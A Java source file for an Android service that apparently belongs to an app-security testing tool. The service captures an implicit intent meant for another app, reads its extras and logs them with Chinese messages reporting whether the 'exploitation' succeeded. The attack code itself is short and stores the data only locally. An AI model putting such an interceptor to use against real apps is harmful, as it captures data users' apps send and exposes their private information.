package com.example.ask.ui.implicitIntent;

import android.app.Service;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.Nullable;

import com.example.ask.R;
import com.example.ask.util.FileUtil;
import com.example.ask.util.ResourceUtil;

import static com.example.ask.broadcast.AskBroadcastReceiver.category_id;

public class HijackingImplicitIntentService extends Service {
    Handler handler;
    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i("ExportedService","service onStartCommand");
        handler=new Handler(Looper.getMainLooper());
        FileUtil.saveResultToFile("成功劫持隐式intent。", HijackingImplicitIntentService.this);
        String name = "R.array." + category_id + "_extras";
        String[] extras = ResourceUtil.getStringArrayByName(HijackingImplicitIntentService.this, name);
        FileUtil.saveResultToFile("开始解析intent中的数据........", HijackingImplicitIntentService.this);
        if (extras == null){
            FileUtil.saveResultToFile("所劫持的intent中无数据。", HijackingImplicitIntentService.this);
            FileUtil.saveResultToFile("利用失败。", HijackingImplicitIntentService.this);
            handler.post(new Runnable(){
                public void run(){
                    Toast.makeText(getApplicationContext(), "成功劫持隐式intent。\n" +
                            "所劫持的intent中无数据。\n 利用失败。", Toast.LENGTH_LONG).show();
                }
            });
        } else{
            FileUtil.saveResultToFile("intent数据解析如下：", HijackingImplicitIntentService.this);
            Bundle bundle = intent.getExtras();
            String s = "";
            for (String extra_key : extras){
                String value = bundle.getString(extra_key);
                if (value == null){
                    continue;
                }
                s = s + extra_key + ":   " + value + "\n";
                FileUtil.saveResultToFile(extra_key + ":   " + value, HijackingImplicitIntentService.this);
            }
            FileUtil.saveResultToFile("利用成功。", HijackingImplicitIntentService.this);
            final String finalS = s;
            handler.post(new Runnable(){
                public void run(){
                    Toast.makeText(getApplicationContext(), "成功劫持隐式intent。\n" +
                            "intent数据解析如下：\n" + finalS + "利用成功。", Toast.LENGTH_LONG).show();
                }
            });
        }

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}
